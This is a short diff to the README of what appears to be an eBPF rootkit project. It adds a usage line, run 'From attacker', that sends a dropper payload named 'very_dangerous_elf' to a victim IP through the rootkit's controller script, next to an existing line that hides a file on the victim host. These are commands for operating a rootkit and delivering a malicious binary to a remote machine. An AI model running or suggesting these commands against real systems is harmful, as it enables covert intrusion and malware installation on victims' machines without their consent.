@@ -74,4 +74,5 @@ A controller script (`controller/controller.py`, written in Python 3) is provide
 ```bash
 # From attacker:
 sudo python3 controller.py -i <iface> <victim_ip> hide_file "Rootkit-eBPF"
+sudo python3 controller.py -i <iface> <victim_ip> dropper_send "very_dangerous_elf" 
 ```
